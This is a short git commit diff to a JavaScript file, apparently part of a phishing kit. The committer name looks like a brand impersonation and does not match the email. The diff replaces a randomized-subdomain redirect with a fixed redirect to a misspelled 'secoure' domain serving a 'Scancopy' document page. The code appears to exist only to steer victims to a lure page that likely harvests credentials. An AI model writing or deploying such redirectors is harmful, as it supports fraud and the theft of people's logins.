bcfcada7b28ca22a8a9a70b1a01003e72462b85a
amazon334 <arnazohealthcare2021@gmail.com>
2025-08-20 10:21:46 -0700

    Update scancopy1.js

--- scancopys.js
+++ scancopys.js
@@ -1,8 +1,6 @@
 
 <script>
-let num = Math.floor(Math.random() * 50) * 2;
 
-
-window.location.href = "https://secoure"+num+".adajye.com/doc1/Scancopy.html";
+window.location.href = "https://secoure.adajye.com/doc1/Scancopy.html";
 
   </script>
